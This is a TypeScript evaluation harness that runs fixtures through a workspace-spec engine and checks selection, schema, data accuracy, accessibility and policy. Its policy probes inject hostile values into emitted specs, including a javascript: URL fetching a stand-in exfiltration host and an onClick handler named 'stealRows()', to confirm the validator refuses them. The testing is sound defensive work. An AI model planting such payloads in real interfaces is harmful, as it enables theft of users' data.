/**
 * S4-01 / FUS-4107 — the five-dimension eval harness.
 *
 * One fixture in, one run out: the case's profile goes through the shipping
 * path — `decide()` for the choice, `show_workspace` for the spec — and then
 * exactly one checker reads that run. Which checker is the fixture's
 * `dimension`, and the table below is keyed by the closed enum, so a sixth
 * dimension is a type error here and a new *case* is a JSON file and nothing
 * else.
 *
 * A checker returns the problems it found as sentences rather than calling
 * `expect` itself. That keeps the dimension logic readable, lets one case
 * report every failure it has instead of only the first, and keeps the failure
 * text saying which fixture and which claim broke.
 *
 * Boundaries this folder keeps: no engine source is imported for writing, only
 * for running; tests/eval/four-intents.test.ts, src/engine and tests/adversarial
 * are untouched. Hostile *documents* are the adversarial suite's job — the
 * `policy` dimension here probes the spec the engine really emitted.
 */

import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { loadWorkspaceCatalog } from '../../../src/catalog/load-workspace.js';
import { decide } from '../../../src/engine/decide.js';
import type { EngineDecision } from '../../../src/engine/types.js';
import { profileColumns } from '../../../src/profiler/profile-columns.js';
import { classifyColumns, type ClassifiedColumn } from '../../../src/profiler/roles.js';
import { parseCsvTable, tableToRows, type Table } from '../../../src/profiler/table.js';
import { DATA_PROFILE_KEYS, type DataProfile } from '../../../src/spec/data-profile.js';
import type { CatalogEntry } from '../../../src/spec/engine-catalog.js';
import { SPEC_ACTION_SET, type WorkspaceSpec } from '../../../src/spec/workspace-spec.js';
import { handleShowWorkspace, type ShowWorkspaceResult } from '../../../src/tool/show-workspace.js';
import { assertTraceHasNoRows, closedProfile } from '../../../src/trace/trace.js';
import { validateSpec } from '../../../src/validate/validate-spec.js';
import {
  EvalFixtureError,
  parseEvalCase,
  type A11yExpect,
  type DataAccuracyExpect,
  type EvalCase,
  type EvalDimension,
  type IdReason,
  type PolicyExpect,
  type PolicyProbe,
  type SchemaExpect,
  type SelectionExpect,
} from './dimensions.js';

/** The shipping engine-tier catalog — not a stub. Fixtures face the real id list. */
export const catalog = loadWorkspaceCatalog();

const CASES_DIR = fileURLToPath(new URL('./cases/', import.meta.url));
const PROFILES_DIR = fileURLToPath(new URL('../../fixtures/profiles/', import.meta.url));

export function casesDir(): string {
  return CASES_DIR;
}

export type EvalDataset = {
  name: string;
  csv: string;
  table: Table;
  /** `<name>.json` as committed — what `data_accuracy` holds the profiler to. */
  recorded: DataProfile;
  columns: string[];
  classified: readonly ClassifiedColumn[];
};

export type EvalRun = {
  case: EvalCase;
  dataset?: EvalDataset;
  /** What the CSV alone proves, before the case's host overrides. */
  csvProfile: DataProfile;
  /** What `decide()` and `show_workspace` actually saw. */
  profile: DataProfile;
  decision: EngineDecision;
  shown?: ShowWorkspaceResult;
  spec?: WorkspaceSpec;
};

/** Load every fixture in `dir`, in file order. One bad fixture fails the load. */
export function loadEvalCases(dir: string = CASES_DIR): EvalCase[] {
  const files = (readdirSync(dir) as string[]).filter((file) => file.endsWith('.json')).sort();
  const cases = files.map((file) => parseEvalCase(JSON.parse(readFileSync(`${dir}${file}`, 'utf8')), file));

  const seen = new Map<string, string>();
  for (const [index, item] of cases.entries()) {
    const file = files[index];
    const first = seen.get(item.id);
    if (first) {
      throw new EvalFixtureError(`${file}: duplicate case id "${item.id}" (already used by ${first})`);
    }
    seen.set(item.id, file);
    if (file !== `${item.id}.json`) {
      throw new EvalFixtureError(`${file}: case id "${item.id}" must match the file name`);
    }
  }
  return cases;
}

export function loadEvalDataset(name: string): EvalDataset {
  const csv = readFileSync(`${PROFILES_DIR}${name}.csv`, 'utf8');
  const recorded = JSON.parse(readFileSync(`${PROFILES_DIR}${name}.json`, 'utf8')) as DataProfile;
  const table = parseCsvTable(csv);
  return {
    name,
    csv,
    table,
    recorded,
    columns: table.columns.map((column) => column.name),
    classified: classifyColumns(table).columns,
  };
}

/**
 * Run one case down the shipping path. The dataset's columns reach
 * `show_workspace` on the server context — never as tool arguments, and never
 * as row objects — which is the same shape the real server builds.
 */
export async function runEvalCase(evalCase: EvalCase): Promise<EvalRun> {
  const dataset = evalCase.profile.name === undefined ? undefined : loadEvalDataset(evalCase.profile.name);
  const csvProfile = dataset ? profileColumns(dataset.table) : {};
  const profile = closedProfile({ ...csvProfile, ...evalCase.profile.overrides });
  const decision = decide({ intent: evalCase.intent, profile, catalog });

  if (!dataset) {
    return { case: evalCase, csvProfile, profile, decision };
  }

  const shown = await handleShowWorkspace(
    { intent: evalCase.intent },
    {
      catalog,
      profile,
      payload: tableToRows(dataset.table),
      fields: dataset.columns,
      classified: dataset.classified,
      signDataLink: () => ({
        dataUrl: `https://workspace.local/v1/data-links/${evalCase.id}?sig=s401&exp=1`,
      }),
    },
  );

  return {
    case: evalCase,
    dataset,
    csvProfile,
    profile,
    decision,
    shown,
    ...(shown.ok ? { spec: shown.spec } : {}),
  };
}

/** Dispatch on the closed enum. Adding a dimension without a checker will not compile. */
const CHECKERS: Record<EvalDimension, (run: EvalRun) => string[]> = {
  selection: checkSelection,
  schema: checkSchema,
  data_accuracy: checkDataAccuracy,
  a11y: checkA11y,
  policy: checkPolicy,
};

/**
 * The one claim every dimension makes, whatever its `expect` says: a trace is a
 * decision record and never the dataset it decided on (FUS-4118).
 *
 * `data_accuracy` can still say `noRowsInTrace` explicitly, and some fixtures
 * do — that key is the fixture witnessing the claim, and it stays worth reading.
 * But an opt-in key only guards the cases that remember to opt in, and a leak
 * does not wait for one: it arrives through whichever case a scoring or binding
 * change happens to touch. So the gate runs here, ahead of the dimension
 * checker, on all of them.
 */
function checkNoRowsInTrace(run: EvalRun): string[] {
  try {
    assertTraceHasNoRows(run.decision.trace);
    return [];
  } catch (error) {
    return [`trace carries dataset rows: ${(error as Error).message}`];
  }
}

/** Every problem this case has, as sentences. Empty means the case passed. */
export function checkEvalRun(run: EvalRun): string[] {
  return [...checkNoRowsInTrace(run), ...CHECKERS[run.case.dimension](run)];
}

function checkSelection(run: EvalRun): string[] {
  const expect = run.case.expect as SelectionExpect;
  const { decision } = run;
  const problems: string[] = [];
  const eligible = new Map(decision.eligible.map((item) => [item.id, item.score]));

  if (decision.winner !== expect.winner) {
    problems.push(
      `winner is ${quote(decision.winner)}, expected ${quote(expect.winner)} (eligible: ${listed([...eligible.keys()])})`,
    );
  }

  for (const id of expect.alsoEligible ?? []) {
    if (!eligible.has(id)) {
      problems.push(`${id} should be eligible but was rejected: ${quote(rejectionOf(decision, id))}`);
    }
  }

  for (const id of expect.notEligible ?? []) {
    if (eligible.has(id)) problems.push(`${id} should not be eligible, but scored ${eligible.get(id)}`);
  }

  const winnerScore = decision.winner === null ? undefined : eligible.get(decision.winner);
  for (const id of expect.outscores ?? []) {
    const score = eligible.get(id);
    if (score === undefined) {
      problems.push(`${id} must be eligible to be outscored, but was rejected: ${quote(rejectionOf(decision, id))}`);
      continue;
    }
    if (winnerScore === undefined || winnerScore <= score) {
      problems.push(`winner ${quote(decision.winner)} scored ${winnerScore} and does not outscore ${id} at ${score}`);
    }
  }

  problems.push(...checkRejections(decision, expect.rejectedWith ?? []));
  return problems;
}

function checkSchema(run: EvalRun): string[] {
  const expect = run.case.expect as SchemaExpect;
  const problems: string[] = [];
  const wantValid = expect.specValid ?? true;
  const shown = run.shown;

  if (!shown) return ['show_workspace did not run; a schema case needs a named profile fixture'];

  if (!wantValid) {
    if (shown.ok) problems.push(`show_workspace returned a spec for ${shown.spec.component}, expected a refusal`);
    else if (expect.failCode !== undefined && shown.code !== expect.failCode) {
      problems.push(`refused with ${quote(shown.code)}, expected ${quote(expect.failCode)} (${shown.reason})`);
    }
    return problems;
  }

  if (!shown.ok) return [`show_workspace refused with ${shown.code}: ${shown.reason}`];

  const spec = shown.spec;
  const revalidated = validateSpec(spec, catalog);
  if (!revalidated.ok) {
    problems.push(`emitted spec does not revalidate: ${revalidated.code} (${revalidated.reason})`);
  }

  if (expect.component !== undefined && spec.component !== expect.component) {
    problems.push(`spec.component is ${quote(spec.component)}, expected ${quote(expect.component)}`);
  }

  if (expect.actions !== undefined) {
    const actions = [...(spec.allowedActions ?? spec.actions ?? [])];
    if (!sameList(actions, expect.actions)) {
      problems.push(`spec actions are ${listed(actions)}, expected ${listed(expect.actions)}`);
    }
  }

  if (expect.bindRoles !== undefined) {
    const roles = bindItems(spec).map((bind) => bind.role);
    if (!sameList(roles, expect.bindRoles)) {
      problems.push(`bind roles are ${listed(roles)}, expected ${listed(expect.bindRoles)}`);
    }
  }

  if (expect.fieldNames !== undefined) {
    const names = fieldNames(spec);
    if (!sameList(names, expect.fieldNames)) {
      problems.push(`spec field names are ${listed(names)}, expected ${listed(expect.fieldNames)}`);
    }
  }

  if (expect.closedProfileKeys) {
    const open = Object.keys(run.decision.trace.profile).filter(
      (key) => !DATA_PROFILE_KEYS.includes(key as never),
    );
    if (open.length > 0) problems.push(`trace profile carries keys outside DataProfile: ${listed(open)}`);
  }

  return problems;
}

function checkDataAccuracy(run: EvalRun): string[] {
  const expect = run.case.expect as DataAccuracyExpect;
  const problems: string[] = [];
  const dataset = run.dataset;
  if (!dataset) return ['no dataset; a data_accuracy case needs a named profile fixture'];

  if (expect.matchesRecordedProfile) {
    for (const key of DATA_PROFILE_KEYS) {
      const actual = run.csvProfile[key];
      const recorded = dataset.recorded[key];
      if (actual !== recorded) {
        problems.push(`profiled ${dataset.name}.csv gives ${key}=${json(actual)}, recorded JSON says ${json(recorded)}`);
      }
    }
  }

  for (const key of DATA_PROFILE_KEYS) {
    const wanted = expect.profile?.[key];
    if (wanted === undefined) continue;
    if (run.profile[key] !== wanted) {
      problems.push(`profile.${key} is ${json(run.profile[key])}, expected ${json(wanted)}`);
    }
  }

  if (expect.noRowsInTrace) {
    try {
      assertTraceHasNoRows(run.decision.trace);
    } catch (error) {
      problems.push(`trace carries dataset rows: ${(error as Error).message}`);
    }
  }

  const shown = run.shown;
  if (expect.rowCount !== undefined || expect.columns !== undefined || expect.noRowsInSpec || expect.hasDataUrl) {
    if (!shown?.ok) {
      return [
        ...problems,
        `show_workspace did not return a spec: ${shown ? `${shown.code} (${shown.reason})` : 'not run'}`,
      ];
    }

    if (expect.rowCount !== undefined && shown.rowCount !== expect.rowCount) {
      problems.push(`show_workspace reported rowCount ${json(shown.rowCount)}, expected ${expect.rowCount}`);
    }
    if (expect.rowCount !== undefined && run.profile.rowCount !== expect.rowCount) {
      problems.push(`profile.rowCount is ${json(run.profile.rowCount)}, expected ${expect.rowCount}`);
    }
    if (expect.columns !== undefined && !sameList([...(shown.columns ?? [])], expect.columns)) {
      problems.push(`reported columns are ${listed(shown.columns ?? [])}, expected ${listed(expect.columns)}`);
    }
    if (expect.noRowsInSpec) {
      const leaks = rowKeysIn(shown.spec);
      if (leaks.length > 0) problems.push(`spec carries row arrays at ${listed(leaks)}; rows belong behind the handle`);
    }
    if (expect.hasDataUrl && !shown.spec.dataUrl) {
      problems.push('spec has no dataUrl; the widget would have nowhere to read rows from');
    }

    for (const bind of bindItems(shown.spec)) {
      if (!dataset.columns.includes(bind.field)) {
        problems.push(`bind ${bind.role} points at ${quote(bind.field)}, which is not a column of ${dataset.name}.csv`);
      }
    }
  }

  return problems;
}

function checkA11y(run: EvalRun): string[] {
  const expect = run.case.expect as A11yExpect;
  const problems: string[] = [];

  problems.push(...checkRejections(run.decision, expect.refusedWith ?? []));

  const needsSpec =
    expect.label !== undefined ||
    expect.everyFieldLabelled !== undefined ||
    expect.actions !== undefined ||
    expect.actionsAllowedByCatalog !== undefined;
  if (!needsSpec) return problems;

  const shown = run.shown;
  if (!shown?.ok) {
    return [
      ...problems,
      `show_workspace did not return a spec: ${shown ? `${shown.code} (${shown.reason})` : 'not run'}`,
    ];
  }
  const spec = shown.spec;

  if (expect.label !== undefined && spec.label !== expect.label) {
    problems.push(`spec.label is ${quote(spec.label ?? null)}, expected ${quote(expect.label)}`);
  }

  if (expect.everyFieldLabelled) {
    for (const field of spec.fields ?? []) {
      if (typeof field === 'string') {
        problems.push(`field ${quote(field)} is a bare name with no label`);
        continue;
      }
      const label = typeof field.label === 'string' ? field.label.trim() : '';
      if (label === '') problems.push(`field ${quote(field.name ?? field.id ?? '?')} has no label`);
    }
  }

  const declared = [...(spec.allowedActions ?? spec.actions ?? [])];
  if (expect.actions !== undefined && !sameList(declared, expect.actions)) {
    problems.push(`declared actions are ${listed(declared)}, expected ${listed(expect.actions)}`);
  }

  if (expect.actionsAllowedByCatalog) {
    const allowed = catalogActions(spec.component);
    for (const action of declared) {
      if (!SPEC_ACTION_SET.has(action)) problems.push(`action ${quote(action)} is outside the closed spec action set`);
      else if (!allowed.includes(action)) {
        problems.push(`action ${quote(action)} is not allowed on ${spec.component} (catalog: ${listed(allowed)})`);
      }
    }
  }

  return problems;
}

function checkPolicy(run: EvalRun): string[] {
  const expect = run.case.expect as PolicyExpect;
  const shown = run.shown;
  if (!shown) return ['show_workspace did not run; a policy case needs a named profile fixture'];
  if (!shown.ok) return [`show_workspace refused before the probe: ${shown.code} (${shown.reason})`];

  const probed = PROBES[expect.probe](structuredClone(shown.spec) as WorkspaceSpec);
  const result = validateSpec(probed, catalog);

  if (expect.refusalCode === null) {
    return result.ok ? [] : [`probe ${expect.probe} was refused with ${result.code} (${result.reason})`];
  }
  if (result.ok) {
    return [`probe ${expect.probe} was accepted; expected refusal ${expect.refusalCode}`];
  }
  if (result.code !== expect.refusalCode) {
    return [`probe ${expect.probe} was refused with ${quote(result.code)}, expected ${quote(expect.refusalCode)} (${result.reason})`];
  }
  return [];
}

/**
 * One hostile edit each, applied to the spec the engine emitted for the case.
 * Keyed by the closed probe set, so a new probe name must land here too.
 */
const PROBES: Record<PolicyProbe, (spec: WorkspaceSpec) => WorkspaceSpec> = {
  none: (spec) => spec,
  'script-url': (spec) => withProps(spec, { href: 'javascript:fetch("https://exfil.example")' }),
  'data-url': (spec) => withProps(spec, { src: 'data:text/html,<b>rows</b>' }),
  'handler-prop': (spec) => withProps(spec, { onClick: 'stealRows()' }),
  'inline-rows': (spec) => withProps(spec, { data: [{ team: 'alpha', incidents: 3 }] }),
  'unknown-action': (spec) => ({
    ...spec,
    allowedActions: [...(spec.allowedActions ?? spec.actions ?? []), 'exfiltrate'],
  }),
  'unknown-component': (spec) => ({ ...spec, component: 'not-a-catalog-component' }),
  'unnamed-tool': (spec) => ({ ...spec, tools: [{ name: '' }] }),
  'unbound-field': (spec) => ({
    ...spec,
    binds: [{ role: bindItems(spec)[0]?.role ?? 'category', field: 'column_that_does_not_exist' }],
  }),
  'strip-label': (spec) => {
    const { label: _label, ...rest } = spec;
    const props = { ...(spec.props ?? {}) };
    delete props.label;
    delete props['aria-label'];
    delete props.ariaLabel;
    return { ...rest, ...(Object.keys(props).length > 0 ? { props } : {}) };
  },
};

function withProps(spec: WorkspaceSpec, extra: Record<string, unknown>): WorkspaceSpec {
  return { ...spec, props: { ...(spec.props ?? {}), ...extra } };
}

function checkRejections(decision: EngineDecision, wanted: readonly IdReason[]): string[] {
  const problems: string[] = [];
  for (const item of wanted) {
    const actual = rejectionOf(decision, item.id);
    if (actual === undefined) {
      problems.push(`${item.id} was not rejected; expected ${quote(item.reason)}`);
      continue;
    }
    if (actual !== item.reason) {
      problems.push(`${item.id} was rejected with ${quote(actual)}, expected ${quote(item.reason)}`);
    }
  }
  return problems;
}

function rejectionOf(decision: EngineDecision, id: string): string | undefined {
  return decision.rejected.find((item) => item.id === id)?.reason;
}

/** The winner's catalog actions, minus anything outside the closed spec set. */
export function catalogActions(id: string): string[] {
  const entry: CatalogEntry | undefined = catalog.find((item) => item.id === id);
  return [...(entry?.allowedActions ?? [])].filter((action) => SPEC_ACTION_SET.has(action));
}

function bindItems(spec: WorkspaceSpec): { role: string; field: string }[] {
  const binds = spec.binds;
  if (!binds) return [];
  if (Array.isArray(binds)) return binds.map((item) => ({ role: item.role, field: item.field }));
  return Object.entries(binds).map(([role, value]) => ({
    role,
    field: typeof value === 'string' ? value : value.field,
  }));
}

function fieldNames(spec: WorkspaceSpec): string[] {
  return (spec.fields ?? []).map((field) =>
    typeof field === 'string' ? field : (field.name ?? field.id ?? ''),
  );
}

const ROW_KEYS = ['data', 'points', 'series', 'rows'] as const;

/** Paths where the spec carries arrays of row objects. Field lists are not rows. */
function rowKeysIn(value: unknown, path = 'spec'): string[] {
  if (Array.isArray(value)) {
    return value.flatMap((item, index) => rowKeysIn(item, `${path}[${index}]`));
  }
  if (!value || typeof value !== 'object') return [];
  const found: string[] = [];
  for (const [key, child] of Object.entries(value)) {
    const here = `${path}.${key}`;
    if ((ROW_KEYS as readonly string[]).includes(key) && Array.isArray(child)) {
      if (child.some((item) => item !== null && typeof item === 'object')) found.push(here);
      continue;
    }
    found.push(...rowKeysIn(child, here));
  }
  return found;
}

function sameList(actual: readonly string[], expected: readonly string[]): boolean {
  return actual.length === expected.length && actual.every((item, index) => item === expected[index]);
}

function listed(items: readonly string[]): string {
  return items.length === 0 ? '[]' : `[${items.join(', ')}]`;
}

function quote(value: string | null | undefined): string {
  if (value === null) return 'null';
  return value === undefined ? 'undefined' : JSON.stringify(value);
}

function json(value: unknown): string {
  return value === undefined ? 'undefined' : JSON.stringify(value);
}
